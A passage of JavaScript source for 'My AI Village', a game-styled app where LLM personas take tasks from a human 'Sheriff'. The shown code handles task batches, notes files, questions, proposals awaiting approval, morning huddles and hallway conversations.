    sections.map(h => `\n## ${h}\n_Nothing yet._\n`).join('');
  for (const t of townspeople()) {
    const file = path.join(AGENTS, t.key, 'NOTES.md');
    if (!fs.existsSync(file)) fs.writeFileSync(file, fresh(t.name, `What I learn while working on **${t.area}** for the Sheriff.`, ["What I've learned", 'People and contacts', 'Open items', 'Conversations']));
  }
  for (const w of workers()) {
    const file = path.join(w.dir, 'NOTES.md'), boss = townspeople().find(t => t.key === w.owner);
    if (!fs.existsSync(file)) fs.writeFileSync(file, fresh(w.name, `What I learn while helping ${boss.name} with **${boss.area}**.`, ["What I've learned", 'Conversations']));
  }
}

// a townsperson's notes (agents/<key>/NOTES.md) or a worker's (agents/<townsperson>/workers/<key>/NOTES.md)
function notesFileFor(key) {
  if (!/^[a-z]{2,20}$/.test(key)) return null;
  ensureNotes();
  const own = path.join(AGENTS, key, 'NOTES.md');
  if (fs.existsSync(own)) return own;
  for (const tp of fs.existsSync(AGENTS) ? fs.readdirSync(AGENTS) : []) {
    const w = path.join(AGENTS, tp, 'workers', key, 'NOTES.md');
    if (fs.existsSync(w)) return w;
  }
  return null;
}

function addNote(agent, section, text) {
  const file = notesFileFor(agent);
  if (!file) return false;
  text = String(text).replace(/\s+/g, ' ').trim().slice(0, 400);
  if (!text) return false;
  let notes = fs.readFileSync(file, 'utf8');
  const head = new RegExp('^## ' + section + '\\s*$', 'm');
  if (!head.test(notes)) notes = notes.replace(/\s*$/, `\n\n## ${section}\n`);
  notes = notes.replace(new RegExp('^## ' + section + '\\s*\\n', 'm'), (h) => `${h}- ${today()}: ${text}\n`);
  notes = notes.replace(new RegExp('(^## ' + section + '\\s*\\n(?:- .*\\n)+)_Nothing yet\\._\\n?', 'm'), '$1');
  fs.writeFileSync(file, notes);
  return true;
}

// ---------- Marshall ----------
function marshallPrompt() {
  const roster = townspeople().map(t => `- ${t.key}: ${t.name} (${t.area})`).join('\n');
  return fs.readFileSync(MARSHALL_PERSONA, 'utf8') + `\n\nThe townspeople you can hand work to (use their key):\n${roster}\n` + `\n\n## Your notes` + statusText(null) + toolsNote('marshall') + townFacts() + approvedWorkText('marshall');
}
const pending = [];             // tasks waiting for the Sheriff's "Send next batch"
const working = new Map();      // agent key -> task they're working on right now

// Marshall's TASK lines -> tasks for known townspeople
function parseTasks(answer, order, extra) {
  const known = new Set(townspeople().map(t => t.key));
  const tasks = [];
  for (const m of answer.matchAll(/^\s*\**\s*TASK\s+([a-z]+)(?:\s+after\s+([a-z]+))?\s*\**\s*:\s*(.+)$/gim)) {
    const key = m[1].toLowerCase(), after = (m[2] || '').toLowerCase(), task = tidy(m[3], 300);
    if (known.has(key) && !isNone(task)) tasks.push({ agent: key, task, order, ...(after && after !== key ? { after } : {}), ...(extra || {}) });
  }
  // "after" only counts if that colleague is part of the same job
  for (const t of tasks) if (t.after && !tasks.some(x => x.agent === t.after)) delete t.after;
  return tasks;
}

async function talkToMarshall(text) {
  addLog('Sheriff', 'Marshall', text);
  const answer = await ask('marshall', marshallPrompt(), text, { allowTools: toolsFor('marshall') });
  const reply = sayLine(answer, 320);
  const tasks = parseTasks(answer, text);
  addLog('Marshall', 'Sheriff', reply);
  if ([...answer.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].slice(0, 3).map(m => addQuestion('marshall', m[1], 'chat')).some(Boolean)) noticeOpenItems();
  for (const m of answer.matchAll(/^\s*\**\s*HIRE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
    if (townspeople().some(t => t.key === m[1].toLowerCase())) requestHelp(m[1].toLowerCase(), tidy(m[2], 200), 'Sheriff');
  }
  pending.push(...tasks);
  const sent = sendBatch();
  if (pending.length) {
    addLog('Marshall', 'Sheriff', `That's ${tasks.length} jobs. I've handed out ${sent.length}; ${pending.length} more wait for your go-ahead (Send next batch).`, 'system');
    resolveNotices(n => n.kind === 'batch');
    addNotice('batch', `${pending.length} more job${pending.length > 1 ? 's' : ''} wait for your go-ahead (Send next batch).`, { chat: 'marshall' });
  }
  return { reply, delegated: sent.map(t => ({ agent: t.agent, name: shortName(t.agent), task: t.task })), pending: pending.length };
}

// tasks waiting for a colleague's part of the same job (in memory, like the pending batches)
const afterColleague = [];
function sendBatch() {
  // a task that waits for a colleague doesn't start yet: it starts when that colleague's part is done
  for (let i = pending.length - 1; i >= 0; i--) if (pending[i].after) {
    const t = pending.splice(i, 1)[0];
    afterColleague.push(t);
    addLog('Marshall', shortName(t.agent), `${t.task} (once ${shortName(t.after)} is done; you'll get their work)`, 'task');
    if (t.todoId) updateAssignment(t, { status: `waiting for ${shortName(t.after).split(' ')[0]}` });
  }
  const batch = pending.splice(0, BATCH);
  const orders = readJSON(ORDERS_FILE, []);
  for (const t of batch) {
    orders.push({ time: new Date().toISOString(), order: t.order, task: t.task, to: t.agent, status: 'handed out', todo: t.todoId || null });
    addLog('Marshall', shortName(t.agent), t.task, 'task');
    working.set(t.agent, t.task);
    if (t.todoId) updateAssignment(t, { status: 'working', started: new Date().toISOString() });
    doTask(t).catch(e => {
      addLog(shortName(t.agent), 'Marshall', `(couldn't answer: ${e.message})`, 'problem');
      if (!t.todoId) addLog('Marshall', 'Sheriff', `${shortName(t.agent)} couldn't finish "${t.task}": ${e.message}`, 'problem', { chat: 'marshall' });
      addNotice('problem', `${shortName(t.agent)} couldn't finish "${clip(t.task, 80)}": ${clip(e.message, 160)}`, { log: true });
      working.delete(t.agent);
      if (t.todoId) updateAssignment(t, { status: 'problem', result: e.message });
      releaseAfter(t, { done: `(${shortName(t.agent)} couldn't finish their part: ${e.message}. Do what you can without it.)` });   // nobody waits forever
    });
  }
  writeJSON(ORDERS_FILE, orders);
  return batch;
}

// ---------- the Sheriff's to-do list ----------
// Each item goes to Marshall, who hands it to the right townsperson (or a few, at most 3 at a time).
// When everyone on it has reported back, the item is done; "result" holds exactly what they did.
const loadTodos = () => readJSON(TODOS_FILE, []);
const saveTodos = (t) => writeJSON(TODOS_FILE, t);

function updateAssignment(t, change) {
  const todos = loadTodos();
  const todo = todos.find(x => x.id === t.todoId);
  if (!todo) return;
  const a = todo.assignments.find(x => x.agent === t.agent && x.task === t.task && x.status !== 'done');
  if (a) Object.assign(a, change);
  if (todo.assignments.length && todo.assignments.every(x => x.status === 'done')) {
    todo.status = 'done'; todo.doneAt = new Date().toISOString();
    addLog('Marshall', 'Sheriff', `Done: "${todo.text}". It's crossed off your to-do list; hover over it to see what was done.`, 'system', { chat: 'marshall' });
    const draft = todo.assignments.find(a => a.draftId);
    if (!todo.assignments.some(a => a.workshop)) addNotice(draft ? 'draft' : 'done', draft ? `To-do done: "${clip(todo.text, 80)}". Want it in your Gmail drafts?` : `To-do done: "${clip(todo.text, 100)}"`, { todo: todo.id, draftId: draft ? draft.draftId : null });
  } else if (todo.assignments.some(x => x.status === 'waiting on you')) todo.status = 'waiting';
  else if (todo.assignments.some(x => x.status === 'working' || x.status === 'done')) todo.status = 'working';
  saveTodos(todos);
}

function addTodo(text) {
  const todos = loadTodos();
  const todo = { id: todos.reduce((m, x) => Math.max(m, x.id), 0) + 1, text, status: 'choosing', created: new Date().toISOString(), assignments: [] };
  todos.push(todo); saveTodos(todos);
  addLog('Sheriff', 'Marshall', `To-do: ${text}`, 'todo');
  handleTodo(todo.id).catch(e => {
    const all = loadTodos(), t = all.find(x => x.id === todo.id);
    if (t) { t.status = 'problem'; t.note = e.message; saveTodos(all); }
    addLog('Marshall', 'Sheriff', `(couldn't handle the to-do: ${e.message})`, 'problem');
    addNotice('problem', `Marshall couldn't handle your to-do "${clip(text, 80)}": ${clip(e.message, 160)}`, { todo: todo.id });
  });
  return todo;
}

async function handleTodo(id) {
  const todo = loadTodos().find(x => x.id === id);
  const answer = await ask('marshall', marshallPrompt(),
    `The Sheriff added this to their to-do list: "${todo.text}". Hand it to the one townsperson whose area fits best (several only if it truly needs them). Always hand it to someone unless nobody in town fits.`);
  const reply = sayLine(answer, 320);
  const tasks = parseTasks(answer, todo.text, { todoId: id });
  addLog('Marshall', 'Sheriff', reply);
  const all = loadTodos(), t = all.find(x => x.id === id);
  if (!tasks.length) { t.status = 'needs someone'; t.note = reply; saveTodos(all); addNotice('nofit', `Nobody in town fits your to-do "${clip(todo.text, 80)}". ${clip(reply, 160)}`, { todo: id }); return; }
  t.status = 'handed out'; t.note = reply;
  t.assignments = tasks.map(x => ({ agent: x.agent, name: shortName(x.agent), task: x.task, status: 'waiting' }));
  saveTodos(all);
  pending.push(...tasks);
  const sent = sendBatch();
  if (pending.length) addLog('Marshall', 'Sheriff', `I've handed out ${sent.length}; ${pending.length} more wait for your go-ahead (Send next batch).`, 'system');
}

// ---------- a proactive town: the morning huddle, questions, proposals, hallway talk ----------
// Nothing here runs on its own: it all happens only while the Sheriff has Work Hours on.
// The first time Work Hours goes on each day, the morning huddle runs; while it's on,
// colleagues talk (desk to desk, or when they meet), at most HALLWAY_LIMIT a day.
// With Work Hours off, no Claude runs happen by themselves. Questions go to the Sheriff; the answers become town facts everyone
// knows. Proposed next actions go on the to-do list as "Proposed": nothing happens until approved.
const QUESTIONS_FILE = path.join(HOME, 'questions.json');
const DAY_FILE = path.join(HOME, 'day.json');
const HALLWAY_LIMIT = Number(process.env.VILLAGE_HALLWAY_LIMIT) || 10;
const dayState = () => { const d = readJSON(DAY_FILE, {}); return d.date === today() ? d : { date: today(), started: false, huddle: 'not started', hallways: 0 }; };
const saveDay = (d) => writeJSON(DAY_FILE, d);
const loadQuestions = () => readJSON(QUESTIONS_FILE, []);
const sameText = (a, b) => a.toLowerCase().replace(/[^a-z0-9 ]/g, '').replace(/\s+/g, ' ').trim() === b.toLowerCase().replace(/[^a-z0-9 ]/g, '').replace(/\s+/g, ' ').trim();
// Is this (nearly) a question the Sheriff already answered? Word overlap, ignoring small words.
const STOP = new Set('a an the of to for and or in on at by with what which who whom whose where when how is are was were be do does did we our you your us it its this that these those can could should would will any there their them they i me my'.split(' '));
const wordsOf = (t) => new Set(String(t).toLowerCase().replace(/[^a-z0-9 ]/g, ' ').split(/\s+/).filter(w => w.length > 2 && !STOP.has(w)));
function similar(a, b) {
  const A = wordsOf(a), B = wordsOf(b);
  if (!A.size || !B.size) return false;
  let both = 0; for (const w of A) if (B.has(w)) both++;
  return both / Math.min(A.size, B.size) >= 0.6;
}
// A question that says it's checking a conflict with an earlier answer may be asked again.
const CONFIRMING = /\b(to confirm|confirm|conflict|contradict|changed|still|earlier|before|last (week|time)|previously|instead)\b/i;
function alreadyAnswered(text) {
  if (CONFIRMING.test(text)) return null;
  return [...loadQuestions()].reverse().find(q => q.status === 'answered' && similar(q.text, text)) || null;
}

// a question for the Sheriff. `waitRef`: a task that waits for the answer (an open duplicate gets the task attached too)
function addQuestion(from, text, via, waitRef) {
  text = tidy(text, 400);
  if (isNone(text) || text.length < 8) return null;
  const known = alreadyAnswered(text);
  if (known) {                                   // answered already: remind them where the answer is, don't ask again
    if (from !== 'marshall') addNote(from, "What I've learned", `Already answered by the Sheriff (it's in the town facts): "${clip(known.text, 120)}" → ${clip(known.answer, 250)}`);
    addLog('Village helper', from === 'marshall' ? 'Marshall' : shortName(from), `Not asking the Sheriff again: "${clip(text, 120)}" was already answered: ${clip(known.answer, 200)}`, 'system');
    return { ...known, alreadyAnswered: true };
  }
  const all = loadQuestions();
  const same = all.find(q => q.status === 'open' && sameText(q.text, text));
  if (same) { if (waitRef) { same.waits = [...new Set([...(same.waits || []), waitRef])]; writeJSON(QUESTIONS_FILE, all); return same; } return null; }
  const q = { id: all.reduce((m, x) => Math.max(m, x.id), 0) + 1, from, fromName: from === 'marshall' ? 'Marshall' : shortName(from), text, via, status: 'open', time: new Date().toISOString(), waits: waitRef ? [waitRef] : [] };
  all.push(q); writeJSON(QUESTIONS_FILE, all);
  addLog(q.fromName, 'Sheriff', `Question: ${text}`, 'question');
  return q;
}
// colleagues answer a townsperson's questions (one run each, with their own tools), then the task goes on
async function consultColleagues(t, asks, reply) {
  const name = shortName(t.agent), first = name.split(' ')[0];
  addLog(name, t.from || 'Marshall', `${reply} (Asking ${asks.map(a => shortName(a.to).split(' ')[0]).join(' and ')} first.)`, 'chat');
  if (t.todoId) updateAssignment(t, { status: `asking ${asks.map(a => shortName(a.to).split(' ')[0]).join(' and ')}` });
  const consulted = await Promise.all(asks.map(async (a) => {
    const them = shortName(a.to);
    addLog(name, them, a.q, 'task');
    try {
      const own = ownRun(a.to);
      const ans = await ask(a.to, own.prompt,
        `${name} asks you, for a task from the Sheriff ("${clip(t.task, 200)}"): ${a.q}\nAnswer from your own area, using your tools if they help. Be specific and practical.\n` +
        `After your SAY line (one line to ${first}) add:\nANSWER: your full answer (up to 300 words)\nQUESTION: only if the Sheriff must decide something (optional)\nThen your NOTE line.`, own.opts);
      noteFrom(a.to, ans);
      if ([...ans.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].slice(0, 2).map(m => addQuestion(a.to, m[1], 'consult')).some(Boolean)) noticeOpenItems();
      const answer = clip(block(ans, 'ANSWER') || sayLine(ans, 600), 3000);
      addLog(them, name, answer, 'report');
      addNote(t.agent, 'From colleagues', `${them} answered "${clip(a.q, 100)}": ${clip(answer, 600)}`);
      return { name: them, q: a.q, answer };
    } catch (e) {
      addLog(them, name, `(couldn't answer: ${e.message})`, 'problem');
      return { name: them, q: a.q, answer: `(no answer: ${e.message})` };
    }
  }));
  if (t.todoId) updateAssignment(t, { status: 'working' });
  return doTask({ ...t, consulted });
}

// tasks waiting on the Sheriff's answers (marshall-home/waiting.json): they restart once every question is answered or skipped
const WAITING_FILE = path.join(HOME, 'waiting.json');
const taskRef = (t) => `${t.agent}:${t.todoId || 'order'}:${crypto.createHash('sha1').update(t.task).digest('hex').slice(0, 8)}`;
function waitOnSheriff(t, qs, reply) {
  const name = shortName(t.agent), ref = taskRef(t);
  const waiting = readJSON(WAITING_FILE, {});
  waiting[ref] = { t: { ...t, rounds: (t.rounds || 0) + 1, answered: undefined }, questions: qs.map(q => q.id), since: new Date().toISOString() };
  writeJSON(WAITING_FILE, waiting);
  working.delete(t.agent);
  addLog(name, t.from || 'Marshall', `${reply} (Waiting on the Sheriff: ${qs.length} question${qs.length > 1 ? 's' : ''}.)`, 'question');
  if (t.todoId) updateAssignment(t, { status: 'waiting on you', questions: qs.map(q => q.text) });
  if (t.from === 'Sheriff') addLog(name, 'Sheriff', `I need your answers before I can finish "${clip(t.task, 100)}": they're in Questions (Q).`, 'question', { chat: t.agent });
  else addLog('Marshall', 'Sheriff', `${name} needs your answers before "${clip(t.task, 100)}" can go ahead. They're in Questions (Q).`, 'relay', { chat: 'marshall' });
  const orders = readJSON(ORDERS_FILE, []);
  const o = [...orders].reverse().find(x => x.to === t.agent && x.task === t.task && x.status === 'handed out');
  if (o) { o.status = 'waiting on the Sheriff'; writeJSON(ORDERS_FILE, orders); }
}
function resumeWaiting() {
  const waiting = readJSON(WAITING_FILE, {}), qs = loadQuestions();
  for (const [ref, w] of Object.entries(waiting)) {
    const mine = qs.filter(q => w.questions.includes(q.id));
    if (mine.some(q => q.status === 'open')) continue;
    delete waiting[ref]; writeJSON(WAITING_FILE, waiting);
    const t = { ...w.t, answered: mine.map(q => ({ text: q.text, answer: q.status === 'answered' ? q.answer : '' })) };
    addLog('Marshall', shortName(t.agent), `The Sheriff answered your questions on "${clip(t.task, 100)}". Back to it.`, 'task');
    working.set(t.agent, t.task);
    if (t.todoId) updateAssignment(t, { status: 'working' });
    doTask(t).catch(e => {
      addLog(shortName(t.agent), 'Marshall', `(couldn't answer: ${e.message})`, 'problem');
      working.delete(t.agent);
      if (t.todoId) updateAssignment(t, { status: 'problem', result: e.message });
    });
  }
}
function addProposal(from, text, via) {
  text = tidy(text, 300);
  if (isNone(text) || text.length < 8) return null;
  const todos = loadTodos();
  if (todos.some(t => (t.status === 'proposed' || t.status !== 'done') && sameText(t.text, text))) return null;
  const todo = { id: todos.reduce((m, x) => Math.max(m, x.id), 0) + 1, text, status: 'proposed', proposedBy: from === 'marshall' ? 'Marshall' : shortName(from), via,
    created: new Date().toISOString(), assignments: [] };
  todos.push(todo); saveTodos(todos);
  addLog(todo.proposedBy, 'Sheriff', `Proposed to-do: ${text}`, 'proposal');
  return todo;
}
function noticeOpenItems() {
  const qs = loadQuestions().filter(q => q.status === 'open').length;
  const ps = loadTodos().filter(t => t.status === 'proposed').length;
  resolveNotices(n => n.kind === 'questions' || n.kind === 'proposals');
  if (qs) addNotice('questions', `The town has ${qs} question${qs > 1 ? 's' : ''} for you. Answer them so everyone knows.`, { questions: true });
  if (ps) addNotice('proposals', `${ps} proposed to-do${ps > 1 ? 's' : ''} waiting for your Approve or Decline.`, { todo: true });
}
const HUDDLE_ASK = `It's the morning huddle. Think about your area, your notes and what the town knows so far. What do you need from the Sheriff to do your job well, and what should happen next?
After your SAY line (one line to the room), add:
QUESTION: a question for the Sheriff that you truly need answered and don't already know (one per line, up to 3)
PROPOSE: a concrete next action for the town, small enough to do soon (one per line, up to 2)
ASK key: something you need from another townsperson (use their key; at most 1; leave it out if not needed)
Then your NOTE line. Don't repeat questions the town facts already answer.`;
let huddleRunning = false;
async function runHuddle() {
  if (huddleRunning) throw new Error('The huddle is already running.');
  huddleRunning = true;
  const day = dayState(); day.started = true; day.huddle = 'running'; day.startedAt = new Date().toISOString(); saveDay(day);
  addLog('Sheriff', 'Everyone', 'Start the day: morning huddle.', 'system');
  addLog('Marshall', 'Everyone', "Morning, all. Huddle time: tell me what you need from the Sheriff and what we should do next.", 'chat', { chat: 'marshall' });
  const keys = townspeople().map(t => t.key), raw = [];
  try {
    await Promise.all(keys.map(async (k) => {
      working.set(k, 'Morning huddle');
      try {
        const answer = await ask(k, townspersonPrompt(k, true), HUDDLE_ASK);
        noteFrom(k, answer);
        addLog(shortName(k), 'Everyone', sayLine(answer, 300), 'chat');
        raw.push({ k, questions: [...answer.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].map(m => m[1]).slice(0, 3),
          proposals: [...answer.matchAll(/^\s*\**\s*PROPOSE\s*\**\s*:\s*(.+)$/gim)].map(m => m[1]).slice(0, 2),
          asks: [...answer.matchAll(/^\s*\**\s*ASK\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)].map(m => ({ to: m[1].toLowerCase(), text: m[2] })).slice(0, 1) });
      } catch (e) { addLog(shortName(k), 'Everyone', `(couldn't join the huddle: ${e.message})`, 'problem'); }
      finally { working.delete(k); }
    }));
    // Marshall merges it all: no duplicates, the most useful first
    const listing = raw.map(r => `${r.k}:\n${r.questions.map(q => `  QUESTION: ${q}`).join('\n')}\n${r.proposals.map(p => `  PROPOSE: ${p}`).join('\n')}\n${r.asks.map(a => `  ASK ${a.to}: ${a.text}`).join('\n')}`).join('\n');
    const merged = await ask('marshall', marshallPrompt(),
      `Morning huddle results from the townspeople:\n${listing}\n\nMerge them for the Sheriff. Combine duplicates, keep each to one clear line, most important first, and drop anything the town facts already answer.\n` +
      `Answer in exactly these lines and nothing else:\nSAY: one or two sentences to the Sheriff summing up the huddle\nQUESTION key: a question for the Sheriff, with the key of whoever asked it (at most 12)\nPROPOSE key: a proposed to-do, with the key of whoever proposed it (at most 8)\nPASS from to: something one townsperson needs from another (from and to are keys; at most 5)`);
    const known = new Set(['marshall', ...keys]);
    let nq = 0, np = 0;
    for (const m of merged.matchAll(/^\s*\**\s*QUESTION\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if (known.has(m[1].toLowerCase()) && nq < 12 && addQuestion(m[1].toLowerCase(), m[2], 'huddle')) nq++;
    for (const m of merged.matchAll(/^\s*\**\s*PROPOSE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if (known.has(m[1].toLowerCase()) && np < 8 && addProposal(m[1].toLowerCase(), m[2], 'huddle')) np++;
    for (const m of merged.matchAll(/^\s*\**\s*PASS\s+([a-z]+)\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
      const [from, to] = [m[1].toLowerCase(), m[2].toLowerCase()];
      if (!known.has(from) || !keys.includes(to)) continue;
      addNote(to, 'Open items', `${from === 'marshall' ? 'Marshall' : shortName(from)} needs from you: ${tidy(m[3], 250)}`);
      addLog(from === 'marshall' ? 'Marshall' : shortName(from), shortName(to), tidy(m[3], 250), 'task');
    }
    addLog('Marshall', 'Sheriff', `${sayLine(merged, 300)} (${nq} question${nq === 1 ? '' : 's'} for you, ${np} proposed to-do${np === 1 ? '' : 's'}.)`, 'relay', { chat: 'marshall' });
    const d = dayState(); d.huddle = 'done'; d.huddleDone = new Date().toISOString(); saveDay(d);
    noticeOpenItems();
  } catch (e) {
    const d = dayState(); d.huddle = 'problem'; saveDay(d);
    addLog('Marshall', 'Sheriff', `The huddle stopped: ${e.message}`, 'problem', { chat: 'marshall' });
    addNotice('problem', `The morning huddle stopped: ${clip(e.message, 160)}`, { log: true });
  } finally { huddleRunning = false; }
}
function answerQuestion(id, answer, skip) {
  const all = loadQuestions(), q = all.find(x => x.id === id);
  if (!q || q.status !== 'open') throw new Error('That question is no longer open.');
  if (skip) { q.status = 'skipped'; }
  else {
    answer = String(answer || '').replace(/\s+/g, ' ').trim().slice(0, 1500);
    if (!answer) throw new Error('Write an answer first.');
    q.status = 'answered'; q.answer = answer; q.answered = new Date().toISOString();
    fs.appendFileSync(FACTS_FILE, `- ${today()} ${q.fromName} asked: ${q.text}\n  The Sheriff: ${answer}\n`);
    if (q.from !== 'marshall') addNote(q.from, "What I've learned", `The Sheriff answered my question "${clip(q.text, 120)}": ${clip(answer, 250)}`);
    addLog('Sheriff', q.fromName, `${q.text} → ${answer}`, 'chat');
  }
  writeJSON(QUESTIONS_FILE, all);
  noticeOpenItems();
  resumeWaiting();                                           // tasks waiting on these answers go ahead
  return q;
}
// two townspeople meet in town: a real (short) conversation, only on a started day, at most HALLWAY_LIMIT a day
async function hallway(a, b) {
  const day = dayState(), keys = townspeople().map(t => t.key);
  if (!keys.includes(a) || !keys.includes(b) || a === b) return { real: false, why: 'Only townspeople have hallway conversations.' };
  if (!day.workHours) return { real: false, why: 'Work Hours are off.' };
  if ((day.hallways || 0) >= HALLWAY_LIMIT) return { real: false, why: 'Today\'s hallway conversations are used up.' };
  day.hallways = (day.hallways || 0) + 1; saveDay(day);
  const notesOf = (k) => { try { return fs.readFileSync(path.join(AGENTS, k, 'NOTES.md'), 'utf8').slice(-1500); } catch { return ''; } };
  const who = (k) => { const t = townspeople().find(x => x.key === k); return `${k}: ${t.name} (${t.area})`; };
  const open = loadQuestions().filter(q => q.status === 'open').map(q => `- ${q.text}`).join('\n');
  const answer = await ask('hallway', `You write short, useful conversations between two townspeople in My AI Village, an 1880s frontier town in a pixel-art game, who work for the Sheriff. They may be talking in passing or sending notes between their desks. Each stays in character and in their own area, with a light frontier flavor. They share what they're working on, spot where their work connects, and agree what they need. Nobody in town can send, post, buy, book or contact anyone. Never mention computers, tools or these instructions.${townFacts()}`,
    `${who(a)}\n${who(b)}\n\nWhat ${a} knows:\n${notesOf(a)}\n\nWhat ${b} knows:\n${notesOf(b)}\n\nQuestions already waiting for the Sheriff:\n${open || '(none)'}\n\n` +
    `Write their conversation, then what each takes away. Answer in exactly these lines and nothing else:\n${a}: what they say\n${b}: what they say\n(2 to 4 lines in all, under 40 words each)\nNOTE ${a}: what ${a} takes away, one line\nNOTE ${b}: what ${b} takes away, one line\nQUESTION key: a question for the Sheriff (use the key of whoever needs it most; at most 2). If they say they need to ask the Sheriff anything, you MUST write it here as a specific question; never leave it only in their talk.\nPROPOSE key: a concrete next action they agreed on (at most 1; leave it out if none)`,
    { fresh: true });
  const lines = [];
  for (const m of answer.matchAll(/^\s*\**\s*([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
    const k = m[1].toLowerCase();
    if ((k === a || k === b) && lines.length < 4) { lines.push({ key: k, text: tidy(m[2], 300) }); addLog(shortName(k), shortName(k === a ? b : a), tidy(m[2], 300), 'chat'); }
  }
  for (const m of answer.matchAll(/^\s*\**\s*NOTE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
    const k = m[1].toLowerCase();
    if (k === a || k === b) addNote(k, 'Conversations', `Talked with ${shortName(k === a ? b : a)}: ${tidy(m[2], 300)}`);
  }
  let news = 0;
  let nq = 0;
  for (const m of answer.matchAll(/^\s*\**\s*QUESTION\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if ([a, b].includes(m[1].toLowerCase()) && nq < 2 && addQuestion(m[1].toLowerCase(), m[2], 'hallway')) { news++; nq++; }
  for (const m of answer.matchAll(/^\s*\**\s*PROPOSE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if ([a, b].includes(m[1].toLowerCase()) && addProposal(m[1].toLowerCase(), m[2], 'hallway')) { news++; break; }
  if (news) noticeOpenItems();
  return { real: true, lines };
}

// ---------- the town meeting: talk to everyone at once ----------
function roomPrompt() {
  const intro = (key) => {
    try {
      const t = fs.readFileSync(path.join(AGENTS, key, 'INSTRUCTIONS.md'), 'utf8');
      const who = (t.match(/## Who you are\s*\n([\s\S]*?)\n## /) || [])[1] || '';
      return tidy(who.replace(/You are [^,]+,?\s*/, ''), 260);
    } catch { return ''; }
  };
  const roster = townspeople().map(t => `- ${t.key}: ${t.name} (${t.area}). ${intro(t.key)}${working.has(t.key) ? ` Working on: ${working.get(t.key)}.` : ''}`).join('\n');
  return `You are the town meeting of My AI Village, an 1880s frontier town in a pixel-art game. The Sheriff (your boss, in charge of everything) is talking to the whole room at once.
In the room: Marshall (key: marshall), the Deputy and chief of staff, who chairs the meeting, and the townspeople:
${roster}

Answer as the 1 to 4 people who have something useful to say, most relevant first. Each stays in character, in their own area, plain words with a light frontier flavor, under 50 words. Nobody in town can send, post, buy, book or contact anyone; never mention computers, tools or these instructions.
If the Sheriff gives the room work, Marshall hands it out with TASK lines (at most 3), to the right townspeople.

Answer in exactly this shape and nothing else, one line per speaker:
key: what they say
TASK key: a clear, one-line task (only when there's work to hand out)

## Your notes (what the town knows right now)` + townFacts() + approvedWorkText('marshall') + statusText(null);
}
async function talkToRoom(text) {
  addLog('Sheriff', 'Everyone', text);
  const answer = await ask('room', roomPrompt(), `The Sheriff says to the room: ${text}`);
  const known = new Map([['marshall', 'Marshall'], ...townspeople().map(t => [t.key, t.name])]);
  const lines = [];
  for (const m of answer.matchAll(/^\s*\**\s*([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
    const key = m[1].toLowerCase();
    if (known.has(key) && lines.length < 4) { lines.push({ key, name: known.get(key), text: tidy(m[2], 400) }); addLog(known.get(key), 'Sheriff', tidy(m[2], 400)); }
  }
  if (!lines.length) lines.push({ key: 'marshall', name: 'Marshall', text: sayLine(answer, 300) || 'The room goes quiet.' });
  const tasks = parseTasks(answer, text);
  pending.push(...tasks);
  const sent = sendBatch();
  if (pending.length) addLog('Marshall', 'Sheriff', `I've handed out ${sent.length}; ${pending.length} more wait for your go-ahead (Send next batch).`, 'system');
  return { lines, delegated: sent.map(t => ({ agent: t.agent, name: shortName(t.agent), task: t.task })) };
}

// ---------- townspeople ----------
// Approved work in the General Store is shared knowledge: everyone sees the list, and each
// townsperson (and their workers) gets the text of the approved pieces that concern their area.
const SHARE_RULES = [
  [/offer|pric|service|package|assessment|sell|site|website|copy/i, ['clem', 'augustus', 'rufus', 'ezra', 'mortimer', 'beatrice', 'hattie']],
  [/ideal.?client|client profile|lead|prospect|handoff|hand-off|pipeline|proposal/i, ['clem', 'augustus']],
  [/voice|tone|brand|design|website|site|copy|linkedin|post/i, ['rufus', 'ezra']],
  [/contract|agreement|terms|privacy|legal|checklist|registration|llc|compliance/i, ['beatrice', 'augustus', 'hattie']],
  [/client list|check-in|feedback|onboard|renewal/i, ['hattie', 'jo']],
  [/deliver|tracker|job|project/i, ['jo', 'silas']],
  [/money|financ|budget|cost|income|invoice/i, ['mortimer', 'silas']],
];
function htmlToText(html) {
  return html.replace(/<(script|style)[\s\S]*?<\/\1>/gi, ' ').replace(/<br\s*\/?>|<\/(p|div|h\d|li|tr|section)>/gi, '\n').replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/g, ' ').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#39;|&rsquo;/g, "'").replace(/&quot;|&ldquo;|&rdquo;/g, '"')
    .replace(/[ \t]+/g, ' ').replace(/\n\s*\n+/g, '\n').trim();
}
function approvedWorkText(agent) {
  let items = [];
  try { items = readJSON(WORKSHOP_FILE, []).filter(x => x.review && x.review.status === 'approved' && !x.supersededBy); } catch { return ''; }
  if (!items.length) return '';
  const concerns = (it) => it.agent === agent || SHARE_RULES.some(([re, who]) => who.includes(agent) && re.test(it.task + ' ' + it.files.join(' ')));
  let out = `\n\n## Approved work in the General Store (the Sheriff approved these; use them)\n` +
    items.map(it => `- ${it.task} (${it.kind || 'files'}, by ${it.doneBy}${it.version > 1 ? `, version ${it.version}` : ''}): ${it.files.join(', ')}`).join('\n');
  let total = 0;
  for (const it of items.filter(concerns)) {
    if (total > 16000) { out += '\n(More approved work is in the General Store.)'; break; }
    for (const name of it.files.filter(safeFileName)) {
      let t = ''; try { t = fs.readFileSync(path.join(WORKSHOP, it.id, name), 'utf8'); } catch { continue; }
      if (name.endsWith('.html') || name.endsWith('.svg')) t = htmlToText(t);
      if (name.endsWith('.css') || name.endsWith('.js')) continue;
      t = clip(t, 3500); total += t.length;
      out += `\n\n### ${it.task}: ${name}\n${t}`;
    }
  }
  return out;
}

// What's going on: open to-dos, recent results (Marshall), or one townsperson's own recent work
function statusText(agent) {
  const todos = loadTodos(), items = readJSON(WORKSHOP_FILE, []);
  const mine = (a) => !agent || a.agent === agent;
